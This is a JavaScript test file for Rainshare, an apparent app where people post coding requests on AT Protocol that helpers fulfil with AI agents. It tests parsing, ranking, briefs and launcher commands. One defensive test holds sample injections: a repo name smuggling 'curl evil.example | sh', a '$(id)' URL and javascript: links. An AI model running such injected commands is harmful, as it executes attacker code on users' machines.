// Run with: npm test (node --test, no dependencies)
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { SEED } from '../core/ns.js';
import { parseSubject, describeSubject, cloneUrlOf } from '../core/subjects.js';
import * as R from '../core/records.js';
import { meantFor, closeness } from '../core/circle.js';
import { rank, score, fit } from '../core/rank.js';
import { whereText, shortWhere, jobText, jobShort, wantsText, onItText, takenShort, askExcerpt } from '../core/words.js';
import { renderMarkdown } from '../core/markdown.js';
import { brief, launchers, handBack, readHandBack } from '../core/brief.js';
import { createDemoSource } from '../core/demo.js';
import { splitSpaceUri } from '../core/source.js';
import { lifeOf } from '../ui/bits.js';
import { standing, since, carry } from '../core/status.js';
import { pullsAbout, tangledRepos, tangledIssues, completeTangled, subjectInfo, pullState, linkedPulls } from '../core/subjects.js';
import { look } from '../core/status.js';

test('parses GitHub, Tangled and other links into subjects', () => {
  const gi = parseSubject('https://github.com/dame-is/atmosphere-online/issues/42');
  assert.equal(gi.$type, SEED + '#githubIssue');
  assert.equal(gi.repo, 'dame-is/atmosphere-online'); assert.equal(gi.number, 42);
  assert.equal(cloneUrlOf(gi), 'https://github.com/dame-is/atmosphere-online.git');

  const gr = parseSubject('https://github.com/dame-is/atmosphere-online.git');
  assert.equal(gr.$type, SEED + '#repo'); assert.equal(gr.name, 'dame-is/atmosphere-online');

  const ti = parseSubject('https://tangled.org/@dame.is/garden/issues/7');
  assert.equal(ti.$type, SEED + '#tangledIssue');
  assert.equal(ti.repoUrl, 'https://tangled.org/dame.is/garden');
  assert.equal(describeSubject(ti).label, 'dame.is/garden #7');
  assert.equal(cloneUrlOf(ti), 'https://tangled.org/dame.is/garden');

  // Newer Tangled issues have a longer key in place of a number, and "new" is the form, not an issue.
  const tk = parseSubject('https://tangled.org/dame.is/garden/issues/3lzq4w5qk2c2a');
  assert.equal(tk.url, 'https://tangled.org/dame.is/garden/issues/3lzq4w5qk2c2a'); assert.equal(describeSubject(tk).label, 'dame.is/garden');
  assert.equal(parseSubject('https://tangled.org/dame.is/garden/issues/new').$type, SEED + '#repo');
  // An issue's own record lives in the repo's account, so its address names the repo.
  const at = parseSubject('at://did:plc:abc/org.tangled.track.ticket/3kxyz');
  assert.deepEqual([at.uri, at.repo], ['at://did:plc:abc/org.tangled.track.ticket/3kxyz', 'did:plc:abc']);
  assert.equal(parseSubject('at://did:plc:abc/sh.tangled.repo.issue/3kxyz'), null);

  const cb = parseSubject('https://codeberg.org/someone/thing');
  assert.equal(cb.forge, 'codeberg');
  assert.equal(parseSubject('not a link'), null);
  assert.equal(parseSubject('javascript:alert(1)'), null);
});

test('builds seeds with sensible defaults and limits', () => {
  assert.throws(() => R.seed({ title: '  ' }), /title/);
  const r = R.seed({ title: 'x'.repeat(200), tags: 'Rust, CLI tools, rust', audience: 'nonsense' });
  assert.equal([...r.title].length, 120);
  assert.deepEqual(r.tags, ['rust', 'cli-tools']);
  assert.equal(r.audience.$type, SEED + '#mutuals');
  assert.ok(r.createdAt && !r.updatedAt && !r.state);
  assert.throws(() => R.seed({ title: 't', audience: 'list' }), /list/);
  const g = R.seed({ title: 't', group: 'did:plc:group' });
  assert.deepEqual(g.audience, { $type: SEED + '#group', group: 'did:plc:group' });
  const w = R.seed({ title: 't', wants: { models: ['claude-opus-5-5', ''], tests: 'required', maxDiffLines: '300' }, specUrl: 'javascript:alert(1)' });
  assert.deepEqual(w.wants, { models: ['claude-opus-5-5'], tests: 'required', maxDiffLines: 300 });
  assert.equal(w.specUrl, undefined);
  const edited = R.seed({ title: 'new' }, { createdAt: '2026-01-01T00:00:00.000Z', state: 'sprouted' });
  assert.equal(edited.createdAt, '2026-01-01T00:00:00.000Z'); assert.equal(edited.state, 'sprouted'); assert.ok(edited.updatedAt);
});

test('profiles keep private fields out of the public copy', () => {
  const p = R.profile({ budget: 'none', circumstances: ['student', 'astronaut'], values: 'Climate, local first', setups: [{ harness: 'claude-code', models: 'claude-opus-5-5' }, { harness: '' }], forecast: { level: 'showers', until: 'not a date' } });
  assert.deepEqual(p.circumstances, ['student']);
  assert.deepEqual(p.values, ['climate', 'local-first']);
  assert.equal(p.setups.length, 1); assert.deepEqual(p.setups[0].models, ['claude-opus-5-5']);
  assert.deepEqual(p.forecast, { level: 'showers' });
  const pub = R.publicProfile(p, ['budget', 'circumstances']);
  assert.equal(pub.budget, undefined); assert.equal(pub.circumstances, undefined); assert.deepEqual(pub.values, p.values);
});

test('takes and deliveries need a real seed and a link', () => {
  assert.throws(() => R.take({ seed: { uri: 'at://x' } }), /found/);
  const t = R.take({ seed: { uri: 'at://a/b/c', cid: 'bafy' }, setup: { harness: 'codex', models: ['gpt-5-codex'] } });
  assert.deepEqual(t.seed, { uri: 'at://a/b/c', cid: 'bafy' });
  assert.throws(() => R.delivery({ seed: { uri: 'at://a/b/c', cid: 'bafy' } }), /pull request/);
  const d = R.delivery({ seed: { uri: 'at://a/b/c', cid: 'bafy' }, url: 'https://github.com/o/r/pull/1', sessionUrl: 'ftp://nope' });
  assert.equal(d.url, 'https://github.com/o/r/pull/1'); assert.equal(d.sessionUrl, undefined);
});

test('audiences decide who a seed is meant for', () => {
  const rec = a => ({ audience: { $type: `${SEED}#${a}`, ...(a === 'list' ? { list: 'at://x/app.bsky.graph.list/1' } : {}) } });
  const base = { viewer: 'did:me', author: 'did:them' };
  const mutual = { following: true, followedBy: true }, theyFollow = { followedBy: true }, iFollow = { following: true };
  assert.equal(meantFor(rec('anyone'), { ...base, viewer: null }), true);
  assert.equal(meantFor(rec('mutuals'), { ...base, viewer: null }), false);
  assert.equal(meantFor(rec('mutuals'), { ...base, rel: mutual }), true);
  assert.equal(meantFor(rec('mutuals'), { ...base, rel: theyFollow }), false);
  assert.equal(meantFor(rec('following'), { ...base, rel: theyFollow }), true);
  assert.equal(meantFor(rec('following'), { ...base, rel: iFollow }), false);
  assert.equal(meantFor(rec('followers'), { ...base, rel: iFollow }), true);
  assert.equal(meantFor(rec('list'), { ...base, inList: true }), true);
  assert.equal(meantFor(rec('list'), { ...base, inList: false }), false);
  assert.equal(meantFor(rec('anyone'), { ...base, rel: { blockedBy: true } }), false);
  assert.equal(meantFor(rec('mutuals'), { viewer: 'did:me', author: 'did:me' }), true);
  assert.equal(closeness({ ...base, rel: mutual }), 'mutual');
  assert.equal(closeness({ ...base, rel: theyFollow }), 'follows-you');
  assert.equal(closeness({ ...base, group: true }), 'group');
});

test('ranking puts the people a helper prioritises first, and says why', () => {
  const me = { did: 'did:me', profile: { priorities: ['low-budget', 'values-aligned'], values: ['climate'], setups: [{ harness: 'claude-code', models: ['claude-opus-5-5'] }] } };
  const items = [
    { uri: 'a', closeness: 'mutual', value: { createdAt: '2026-01-02T00:00:00Z', wants: { models: ['gpt-5'] } }, profile: { budget: 'high' } },
    { uri: 'b', closeness: 'you-follow', value: { createdAt: '2026-01-01T00:00:00Z', values: ['climate'], wants: { models: ['opus'] } }, profile: { budget: 'none' } }
  ];
  const out = rank(items, me);
  assert.equal(out[0].uri, 'b');
  const texts = out[0].reasons.map(r => r.text);
  assert.ok(texts.includes('No paid AI')); assert.ok(texts.some(t => /Shares climate/.test(t))); assert.ok(texts.some(t => /opus: you have it/.test(t)));
  assert.ok(out[1].reasons.some(r => r.tone === 'down'));
  const taken = score({ closeness: 'mutual', value: {}, takes: [{ repo: 'did:other' }] }, me);
  assert.ok(taken.reasons.some(r => r.text === 'Someone’s on it'));
});

test('fit says how well a seed suits a helper, in one sentence', () => {
  const me = { did: 'did:me', profile: { priorities: ['low-budget', 'students'], values: ['accessibility'], offering: ['css'], setups: [{ harness: 'claude-code', models: ['claude-sonnet-5-5'] }] } };
  const strong = fit({ closeness: 'mutual', author: { displayName: 'Juniper Hale' }, value: { tags: ['css'], values: ['accessibility'], wants: { models: ['claude-sonnet-5-5'] } }, profile: { budget: 'none', circumstances: ['student'] } }, me);
  assert.equal(strong.level, 3); assert.equal(strong.label, 'Strong fit');
  assert.equal(strong.why, 'Juniper has no paid AI, is a student and cares about accessibility too. It’d like Sonnet, which you have. It’s css, your kind of work.');
  const some = fit({ closeness: 'you-follow', author: { handle: 'kai.example' }, value: { wants: { models: ['gpt-5'] } }, takes: [{ repo: 'did:other' }] }, me);
  assert.equal(some.level, 1);
  assert.equal(some.why, 'It’s from your circle. Heads up: they’d like GPT-5, which isn’t in your setup. Someone’s already on it.');
  assert.equal(fit({ closeness: 'group', author: { displayName: 'Mo' }, value: {} }, me).why, 'Mo is in your group.');
  assert.equal(fit({ value: {} }, me).why, 'It’s open to everyone.');
  assert.ok(rank([{ closeness: 'mutual', value: {} }], me)[0].fit.label);
});

test('a seed reads as plain lines, not chips', () => {
  const sq = { title: 't', size: 'small', parallel: true, subject: { $type: SEED + '#githubIssue', url: 'https://github.com/o/r/issues/14', repo: 'o/r', number: 14 }, wants: { tests: 'required', maxDiffLines: 200, models: ['claude-opus-5-5', 'claude-sonnet-5-5'], harnesses: ['claude-code'], notes: 'No new dependencies' } };
  assert.equal(whereText(sq), 'GitHub issue #14, o/r'); assert.equal(shortWhere(sq), 'GitHub #14');
  assert.equal(whereText({ subject: { $type: SEED + '#tangledIssue', url: 'https://tangled.org/kai.example/almanac/issues/88', repoUrl: 'https://tangled.org/kai.example/almanac' } }), 'Tangled issue #88, kai.example/almanac');
  assert.equal(whereText({}), 'No repo yet');
  assert.equal(jobText(sq), 'Small. Tests required. Under about 200 lines. More than one helper can try.');
  assert.equal(jobShort(sq), 'small job, tests required'); assert.equal(jobText({}), 'Not said.');
  assert.equal(wantsText(sq, { setups: [{ models: ['claude-sonnet-5-5'] }] }), 'Opus or Sonnet (you have Sonnet). Made with Claude Code. No new dependencies.');
  assert.equal(wantsText({ wants: { models: ['claude-sonnet-5-5'] } }, { setups: [{ models: ['claude-sonnet-5-5'] }] }), 'Sonnet, which you have.');
  assert.equal(wantsText({}), 'Nothing in particular.');
  const item = { takes: [{ repo: 'did:kai', author: { displayName: 'Kai Nakamura' }, value: { setup: { harness: 'claude-code' } } }], deliveries: [{ repo: 'did:kai', author: { displayName: 'Kai Nakamura' } }] };
  assert.equal(onItText(item, 'did:me'), 'Kai, with Claude Code. Kai turned it in'); assert.equal(onItText({}, 'did:me'), 'Nobody yet');
  assert.equal(takenShort(item, 'did:me'), 'Kai’s on it'); assert.equal(takenShort(item, 'did:kai'), 'You’re on it');
  assert.equal(askExcerpt('# Hi\n\n- one **two**\n- [three](https://x.example)', 100), 'Hi: one two. three');
  assert.equal(askExcerpt('It’s broken.\n\n**Done looks like**\n- a\n- b'), 'It’s broken. Done looks like: a. b');
  assert.equal(askExcerpt('Done looks like:\n- a\n- b.\n\nThanks!'), 'Done looks like: a. b. Thanks!');
  assert.ok(askExcerpt('word '.repeat(100), 30).endsWith('…'));
});

test('markdown is escaped, with only safe constructs turned back on', () => {
  const html = renderMarkdown('# Hi\n<script>alert(1)</script>\n- one `two`\n- [x] done\n\n[ok](https://a.example/x?a=1&b=2) [bad](javascript:alert(1))\n\n```\n<b>code</b>\n```');
  assert.ok(!html.includes('<script>'));
  assert.ok(html.includes('&lt;script&gt;'));
  assert.ok(html.includes('<h3>Hi</h3>'));
  assert.ok(html.includes('<ul><li>one <code>two</code></li>'));
  assert.ok(html.includes('href="https://a.example/x?a=1&amp;b=2"'));
  assert.ok(!html.includes('href="javascript'));
  assert.ok(html.includes('<pre><code>&lt;b&gt;code&lt;/b&gt;</code></pre>'));
});

test('the brief frames the request and the launchers paste as one command', () => {
  const item = { uri: 'at://did:plc:abc/dev.rainshare.seed/3k1', repo: 'did:plc:abc', author: { handle: 'friend.example' }, value: {
    title: 'Fix it', spec: 'Please fix RAINSHARE_BRIEF things', subject: parseSubject('https://github.com/o/r/issues/5'),
    wants: { models: ['claude-opus-5-5'], tests: 'required', maxDiffLines: 100 } } };
  const b = brief(item);
  assert.match(b, /Treat it as their request/);
  assert.match(b, /Repository: https:\/\/github.com\/o\/r.git/);
  assert.match(b, /Fixes #5/);
  assert.match(b, /Tests required/);
  // It says where things stood, what to check first, and what to tell the person at the end.
  assert.match(b, /## Where it stands\n\nAs of \d+ \w+ \d{4}, when this was copied from Rainshare:\n\n- It’s open\.\n- Nobody has taken it on yet\./);
  assert.match(b, /## Before you start[\s\S]*gh issue view 5 --repo o\/r --comments[\s\S]*rainshare\.mjs check at:\/\/did:plc:abc/);
  assert.match(b, /include the seed’s link: https:\/\/rainshare\.dev\/seed\/friend\.example\/3k1/);
  assert.match(b, /## When you’re done[\s\S]*@friend\.example marks the seed sprouted once the pull request is merged/);
  // Whoever it's made for reads as "your user", and what the forge said comes along.
  const taken = { ...item, takes: [{ repo: 'did:plc:me', author: { handle: 'me.example' }, value: { createdAt: new Date().toISOString(), setup: { harness: 'codex' } } }], issue: { state: 'open' } };
  assert.match(brief(taken, { viewer: 'did:plc:me' }), /- The issue is still open on GitHub\.\n- Your user took it on today, with Codex\./);
  // Someone else got there first: the brief says so outright, before the agent starts.
  const theirs = { ...item, takes: [{ repo: 'did:plc:kai', author: { handle: 'kai.example' }, value: { createdAt: new Date().toISOString() } }] };
  assert.match(brief(theirs, { viewer: 'did:plc:me' }), /- @kai\.example took it on today\.\n\n@kai\.example is already on it\. Check with them, or with your user, before starting/);
  assert.doesNotMatch(brief(taken, { viewer: 'did:plc:me' }), /is already on it\. Check with them/);
  assert.match(brief({ ...item, value: { title: 'An idea' } }), /No repository is named/);
  // On Tangled the agent pushes and its user opens the pull request, so the brief ends differently.
  const tb = brief({ ...item, value: { title: 't', subject: parseSubject('https://tangled.org/a/b/issues/2') } });
  assert.match(tb, /1\. Look at the issue, and at the repository’s pull requests on tangled\.org, for one that already does this: https:\/\/tangled\.org\/a\/b\/issues\/2 and https:\/\/tangled\.org\/a\/b\/pulls\./);
  assert.match(tb, /pull requests are opened on the web for now\. Push your branch first: to a\/b itself[\s\S]*the form is at https:\/\/tangled\.org\/a\/b\/pulls\/new[\s\S]*link the issue \(https:\/\/tangled\.org\/a\/b\/issues\/2\)[\s\S]*git format-patch[\s\S]*an address like https:\/\/tangled\.org\/a\/b\/pulls\/<id>/);
  assert.match(tb, /1\. The link that opens the pull request, and the title and description to paste into it\.\n2\. That once it’s open it needs turning in on Rainshare/);
  assert.doesNotMatch(tb, /\?pr=|gh pr list|Fixes #/);
  // With nothing set up, the agent hands back a link that carries the pull request.
  assert.match(b, /rainshare\.dev\/seed\/friend\.example\/3k1\?pr=<pull request URL>&model=<model>/);
  assert.doesNotMatch(brief({ ...item, space: 'at://g/space/x/y' }), /\?pr=/);
  const ls = launchers(item);
  assert.deepEqual(ls.map(l => l.id), ['claude', 'cloud', 'codex', 'cli', 'mcp']);
  const claude = ls.find(l => l.id === 'claude').command;
  // The brief mentions the default delimiter, so the heredoc picks a longer one.
  assert.match(claude, /<<'RAINSHARE_BRIEF_'\n/);
  assert.ok(claude.trim().endsWith('RAINSHARE_BRIEF_\n)"'));
  assert.equal(launchers({ ...item, space: 'at://g/space/x/y' }).some(l => l.id === 'cli'), false);
});

test('a space record URI splits into its space and record', () => {
  assert.deepEqual(splitSpaceUri('at://did:plc:g/space/dev.rainshare.board/rainshare/did:plc:me/dev.rainshare.seed/3k1'),
    { space: 'at://did:plc:g/space/dev.rainshare.board/rainshare', repo: 'did:plc:me', collection: 'dev.rainshare.seed', rkey: '3k1' });
  assert.equal(splitSpaceUri('at://did:plc:me/dev.rainshare.seed/3k1'), null);
});

test('the example circle answers like the real source', async () => {
  const mem = new Map(), store = { get: k => mem.get(k) ?? null, set: (k, v) => mem.set(k, v) };
  const src = createDemoSource({ store });
  const { items } = await src.board();
  assert.ok(items.length >= 6);
  const amara = items.find(i => i.rkey === '3sq-amara');
  assert.equal(amara.takes.length, 1); assert.equal(amara.takes[0].author.handle, 'kai.example');
  const juniper = items.find(i => i.rkey === '3sq-juniper');
  await src.take(juniper, { setup: { harness: 'claude-code', models: ['claude-sonnet-5-5'] } });
  await src.turnIn(juniper, { url: 'https://github.com/example/flashdeck/pull/15' });
  const again = await src.seed(juniper.uri);
  assert.equal(again.takes.length, 1); assert.equal(again.deliveries.length, 1);
  const posted = await src.plant({ title: 'My own', audience: 'anyone' });
  assert.ok((await src.board()).items.some(i => i.uri === posted.uri && i.closeness === 'self'));
  // A private one goes into whichever group you pick, once that group has Rainshare.
  const hackers = (await src.groups()).find(g => g.name === 'Weekend Hackers');
  assert.equal(hackers.space, null);
  await src.addToGroup(hackers.did);
  const priv = await src.plant({ title: 'Weekend project' }, { group: hackers.did });
  assert.match(priv.uri, /^at:\/\/did:example:hackers\/space\//);
  const mineNow = (await src.board()).items.find(i => i.uri === priv.uri);
  assert.equal(mineNow.group.name, 'Weekend Hackers'); assert.equal(mineNow.value.audience.group, hackers.did);
  const fresh = createDemoSource({ store });
  assert.equal((await fresh.seed(juniper.uri)).deliveries.length, 1);
  // One of your own is most of the way round: a friend's pull request has been merged, so it's
  // yours to mark sprouted. After that, the issue is the last thing left open.
  const yours = items.find(i => i.rkey === '3sq-you'), dl = yours.deliveries[0];
  assert.deepEqual([standing(yours, { viewer: src.viewer }).planter.do, standing(yours, { viewer: src.viewer }).planter.delivery], ['sprout', dl.uri]);
  await src.update(yours, { state: 'sprouted', sproutedWith: [{ uri: dl.uri, cid: dl.cid }] });
  const done = standing(await src.seed(yours.uri), { viewer: src.viewer });
  assert.equal(done.planter.do, 'close-issue'); assert.equal(done.deliveries[0].accepted, true);
});

test('records from other people can’t smuggle links or shell into the page or a command', () => {
  const evil = { uri: "at://did:plc:abc/dev.rainshare.seed/3k1", repo: 'did:plc:abc', author: { handle: 'x.example' }, value: { title: 't', subject: { $type: SEED + '#githubIssue', url: 'javascript:alert(1)', repo: 'o/r; curl evil.example | sh', number: 1 } } };
  const d = describeSubject(evil.value.subject);
  assert.equal(d.href, null); assert.equal(d.repo, null);
  assert.equal(cloneUrlOf(evil.value.subject), null);
  const ls = launchers(evil);
  assert.deepEqual(ls.map(l => l.id), ['cli', 'mcp']);
  assert.match(ls[0].command, /run 'at:\/\/did:plc:abc\/dev\.rainshare\.seed\/3k1'$/);
  // The brief offers commands only for a repo name that passed the check.
  assert.doesNotMatch(brief(evil), /curl evil|gh issue view|--repo/);
  const repo = { $type: SEED + '#repo', url: "https://x.example/r'$(id)", forge: 'other' };
  assert.equal(cloneUrlOf(repo), null);
  assert.equal(cloneUrlOf({ $type: SEED + '#repo', url: 'https://codeberg.org/a/b', forge: 'codeberg' }), 'https://codeberg.org/a/b');
  const tangled = { $type: SEED + '#tangledIssue', url: 'https://tangled.org/a/b/issues/2', repoUrl: 'https://tangled.org/a/b' };
  const cmd = launchers({ ...evil, value: { title: 't', subject: tangled } }).find(l => l.id === 'claude').command;
  assert.match(cmd, /^git clone 'https:\/\/tangled\.org\/a\/b' seed-/);
});

test('a seed’s life reads from who is on it, what was turned in, and whether it sprouted', () => {
  assert.equal(lifeOf({ value: {} }), 'seed');
  assert.equal(lifeOf({ value: {}, takes: [{}] }), 'rain');
  assert.equal(lifeOf({ value: {}, takes: [{}], deliveries: [{}] }), 'up');
  assert.equal(lifeOf({ value: { state: 'sprouted' }, deliveries: [{}] }), 'sprouted');
});

test('a hand-back link carries the pull request into the turn-in form', () => {
  const item = { uri: 'at://did:plc:abc/dev.rainshare.seed/3k1', repo: 'did:plc:abc', author: { handle: 'friend.example' }, value: { title: 'Fix it' } };
  const link = handBack(item, 'https://github.com/o/r/pull/12', 'claude-opus-5-5');
  assert.equal(link, 'https://rainshare.dev/seed/friend.example/3k1?pr=https://github.com/o/r/pull/12&model=claude-opus-5-5');
  assert.deepEqual(readHandBack(new URL(link).search), { url: 'https://github.com/o/r/pull/12', model: 'claude-opus-5-5', harness: '', sessionUrl: '' });
  // Encoded works too, and so does a Tangled pull's at:// address.
  assert.equal(readHandBack('?pr=' + encodeURIComponent('https://github.com/o/r/pull/12') + '&session=https%3A%2F%2Fclaude.ai%2Fcode%2Fs1').sessionUrl, 'https://claude.ai/code/s1');
  assert.equal(readHandBack('?pr=at://did:plc:abc/org.tangled.track.ticket/3k2').url, 'at://did:plc:abc/org.tangled.track.ticket/3k2');
  // Anything that isn't a link is ignored, so a page can't be made to fill the form with script.
  assert.equal(readHandBack('?pr=javascript:alert(1)'), null);
  assert.equal(readHandBack('?model=x'), null);
  assert.equal(readHandBack(''), null);
  assert.equal(handBack({ ...item, space: 'at://g/space/x/y' }, 'https://x/pull/1'), null);
});

test('where a seed stands says whether it’s clear to start, and why not', () => {
  const now = Date.parse('2026-11-11T12:00:00Z'), ago = d => new Date(now - d * 864e5).toISOString();
  const seed = { uri: 'at://did:plc:abc/dev.rainshare.seed/3k1', repo: 'did:plc:abc', author: { handle: 'friend.example' }, value: { title: 'Fix it', subject: parseSubject('https://github.com/o/r/issues/5') } };
  const kai = { repo: 'did:plc:kai', author: { handle: 'kai.example' } };
  const take = { ...kai, uri: 'at://did:plc:kai/dev.rainshare.take/1', value: { createdAt: ago(3), setup: { harness: 'claude-code' } } };
  const delivery = (state, by = kai) => ({ ...by, uri: 'at://did:plc:kai/dev.rainshare.delivery/1', value: { url: 'https://github.com/o/r/pull/12', createdAt: ago(1) }, state });
  const of = (extra, o) => standing({ ...seed, ...extra }, { now, ...o });

  assert.equal(of({}).verdict, 'clear');
  assert.deepEqual(of({ issue: { state: 'open' }, linked: [] }).lines, ['It’s open.', 'The issue is still open on GitHub.', 'Nobody has taken it on yet.']);
  // someone's on it
  const on = of({ takes: [take] });
  assert.equal(on.verdict, 'on-it'); assert.equal(on.clear, false);
  assert.match(on.lines.join(' '), /@kai\.example took it on 3 days ago, with Claude Code\./);
  assert.match(on.advice, /@kai\.example is already on it/);
  assert.equal(of({ takes: [take], value: { ...seed.value, parallel: true } }).verdict, 'clear');
  // it's yours
  const mine = of({ takes: [take] }, { viewer: 'did:plc:kai' });
  assert.equal(mine.verdict, 'clear'); assert.match(mine.advice, /You’re on it/); assert.match(mine.lines.join(' '), /You took it on 3 days ago/);
  assert.match(of({ takes: [take], deliveries: [delivery('open')] }, { viewer: 'did:plc:kai' }).advice, /You’ve turned it in/);
  assert.match(of({ deliveries: [delivery('closed')] }, { viewer: 'did:plc:kai' }).advice, /closed without being merged/);
  // a pull request is in, or has landed
  assert.equal(of({ takes: [take], deliveries: [delivery('open')] }).verdict, 'turned-in');
  assert.equal(of({ deliveries: [delivery(null)] }).verdict, 'turned-in');
  assert.equal(of({ deliveries: [delivery('closed')] }).verdict, 'clear');
  const merged = of({ deliveries: [delivery('merged')] });
  assert.equal(merged.verdict, 'merged'); assert.deepEqual(merged.planter, { do: 'sprout', delivery: 'at://did:plc:kai/dev.rainshare.delivery/1', text: '@kai.example’s pull request has been merged. If that did it, mark it sprouted.' });
  // a pull request on the forge that nobody turned in still counts, once
  const stray = { url: 'https://github.com/o/r/pull/14', number: 14, by: 'sam', state: 'open' };
  const seen = of({ linked: [stray, { url: 'https://github.com/o/r/pull/12/', number: 12, by: 'kai', state: 'open' }], deliveries: [delivery('open')] });
  assert.equal(seen.linked.length, 1); assert.match(seen.lines.join(' '), /pull request #14 by @sam mentions it \(open\) and hasn’t been turned in on Rainshare/);
  assert.equal(of({ linked: [stray] }).verdict, 'turned-in');
  assert.equal(of({ linked: [{ ...stray, state: 'merged' }] }).planter.do, 'look');
  // the issue was closed, or the seed is finished
  assert.equal(of({ issue: { state: 'closed' } }).verdict, 'issue-closed'); assert.equal(of({ issue: { state: 'closed' } }).planter.do, 'close');
  assert.equal(of({ value: { ...seed.value, state: 'sprouted' }, issue: { state: 'open' } }).planter.do, 'close-issue');
  assert.equal(of({ value: { ...seed.value, state: 'closed' }, takes: [take] }).verdict, 'closed');
  // what the forge said goes along to a fresher copy of the same seed, for a little while
  const looked = { ...seed, issue: { state: 'open' }, linked: [stray], deliveries: [delivery('merged')], lookedAt: now - 5e3 };
  const again = carry(looked, { ...seed, deliveries: [delivery(undefined)] }, { now });
  assert.deepEqual([again.issue.state, again.linked.length, again.deliveries[0].state], ['open', 1, 'merged']);
  assert.equal(carry({ ...looked, lookedAt: now - 600e3 }, { ...seed }, { now }).issue, undefined);
  assert.equal(carry(looked, { ...seed, uri: 'at://did:plc:abc/dev.rainshare.seed/other' }, { now }).linked, undefined);
  assert.equal(since(ago(0), now), 'today'); assert.equal(since(ago(1), now), 'yesterday'); assert.equal(since(ago(20), now), '2 weeks ago'); assert.equal(since('nonsense', now), '');
});

test('pull requests on GitHub are matched to an issue or a seed', () => {
  const pr = (number, body, extra = {}) => ({ html_url: `https://github.com/o/r/pull/${number}`, number, title: 'A change', body, user: { login: 'kai' }, state: 'open', merged_at: null, ...extra });
  const list = [pr(12, 'Fixes #5'), pr(13, 'see #55 and o/r/issues/51'), pr(14, 'https://github.com/o/r/issues/5', { state: 'closed' }), pr(15, 'from https://rainshare.dev/seed/did:plc:abc/3k1.', { state: 'closed', merged_at: '2026-01-01' }), pr(16, null)];
  assert.deepEqual(pullsAbout(list, { repo: 'o/r', number: 5, rkey: '3k1' }).map(p => [p.number, p.state]), [[12, 'open'], [14, 'closed'], [15, 'merged']]);
  assert.deepEqual(pullsAbout(list, { repo: 'o/r', rkey: '3k1' }).map(p => p.number), [15]);
  assert.deepEqual(pullsAbout({ message: 'rate limited' }, { repo: 'o/r', number: 5 }), []);
});

test('Tangled is read through its API: repos, issues, and whether a pull request has landed', async () => {
  // Answers shaped like api.tangled.org's (tangled.org/docs/api/bobbin): an issue and a pull
  // request are both tickets in the repo's own account, and a merged pull request is "completed".
  const REPO = 'did:plc:tngrepo1', OWNER = 'did:plc:tngowner1', T = `at://${REPO}/org.tangled.track.ticket/`;
  const manifest = { uri: `at://${REPO}/org.tangled.repo.manifest/self`, knot: 'knot1.tangled.sh', value: { declaration: { name: 'garden', owner: OWNER }, description: 'A garden' } };
  const ticket = (key, state, title, body, extra = {}) => ({ uri: T + key, cid: 'bafy' + key, state, author: 'did:plc:someone', value: { state, title: { text: title }, body: { text: body }, createdAt: '2026-11-10T00:00:00Z', ...extra } });
  const pulls = [
    ticket('3mpull1', 'completed', 'Sitemap', 'Closes https://tangled.org/alice.example/garden/issues/12', { targetBranch: 'main' }),
    ticket('15', 'open', 'Another go', 'From https://rainshare.dev/seed/x.example/3kseedkey1.', { targetBranch: 'main' }),
    ticket('16', 'open', 'Unrelated', 'See issues/120 and #121', { targetBranch: 'main' })
  ];
  const issues = [ticket('12', 'open', 'Add a sitemap', 'Please.'), ticket('14', 'closed', 'Old one', '')];
  const view = t => ({ uri: t.uri, cid: t.cid, state: t.state, title: t.value.title, body: t.value.body, ...(t.value.targetBranch ? { targetBranch: t.value.targetBranch } : {}) });
  const asked = [], real = globalThis.fetch;
  globalThis.fetch = async input => {
    const u = new URL(String(input)), q = u.searchParams, method = u.pathname.split('/xrpc/')[1];
    asked.push(method || u.host);
    const json = (body, status = 200) => new Response(JSON.stringify(body), { status, headers: { 'content-type': 'application/json' } });
    if (u.host === 'plc.directory') return json({ alsoKnownAs: ['at://alice.example'] });
    if (method === 'com.atproto.identity.resolveHandle') return json({ did: OWNER });
    if (u.host !== 'api.tangled.org') return json({ error: 'NotFound' }, 404);
    if (method === 'org.tangled.repo.listRepos' && q.get('subject') === OWNER) return json({ items: [manifest] });
    if (method === 'org.tangled.repo.getRepoByRepoDid' && q.get('repoDid') === REPO) return json(manifest);
    if (method === 'org.tangled.repo.getRepoByName' && q.get('owner') === OWNER && q.get('name') === 'garden') return json(manifest);
    if (method === 'org.tangled.repo.listIssues' && q.get('subject') === REPO) return json({ items: issues.filter(t => t.state === q.get('state')) });
    if (method === 'org.tangled.repo.listPulls' && q.get('subject') === REPO) return json({ items: pulls.slice(1) });   // the oldest has dropped off the recent list
    if (method === 'org.tangled.search.query' && q.get('repo') === REPO && q.get('kind') === 'pull') return json({ hits: pulls.filter(t => `${t.value.title.text} ${t.value.body.text}`.includes(q.get('q'))).map(t => ({ ...t, nsid: 'org.tangled.track.ticket' })) });
    const t = method === 'org.tangled.track.getTicketView' && [...issues, ...pulls].find(x => x.uri === q.get('uri'));
    return t ? json(view(t)) : json({ error: 'RecordNotFound' }, 404);
  };
  try {
    assert.deepEqual(await tangledRepos(OWNER), [{ uri: manifest.uri, repoDid: REPO, name: 'garden', description: 'A garden', url: 'https://tangled.org/alice.example/garden' }]);
    assert.deepEqual(await tangledIssues(REPO), [{ uri: T + '12', cid: 'bafy12', title: 'Add a sitemap', body: 'Please.', createdAt: '2026-11-10T00:00:00Z' }]);
    // A pasted link and a picked record end up saying the same things.
    const pasted = await completeTangled(parseSubject('https://tangled.org/alice.example/garden/issues/12'));
    assert.deepEqual([pasted.uri, pasted.repo, pasted.repoUrl], [T + '12', REPO, 'https://tangled.org/alice.example/garden']);
    const picked = await completeTangled({ $type: SEED + '#tangledIssue', uri: T + '12' });
    assert.deepEqual([picked.repo, picked.repoUrl, picked.url], [REPO, 'https://tangled.org/alice.example/garden', 'https://tangled.org/alice.example/garden/issues/12']);
    assert.equal(cloneUrlOf(picked), 'https://tangled.org/alice.example/garden');
    // The issue, and the pull requests.
    assert.deepEqual(await subjectInfo(pasted), { title: 'Add a sitemap', body: 'Please.', state: 'open', url: pasted.url });
    assert.equal((await subjectInfo({ $type: SEED + '#tangledIssue', uri: T + '14' })).state, 'closed');
    assert.equal(await subjectInfo({ $type: SEED + '#tangledIssue', uri: 'at://did:plc:old/sh.tangled.repo.issue/3k' }), null);
    assert.equal(await pullState({ url: 'https://tangled.org/alice.example/garden/pulls/3mpull1' }), 'merged');
    assert.equal(await pullState({ pull: T + '15' }), 'open');
    assert.equal(await pullState({ url: 'https://tangled.org/alice.example/garden/issues/12' }), null);   // an issue isn't a pull request
    assert.equal(await pullState({ url: 'https://tangled.org/alice.example/garden/pulls/nope' }), null);
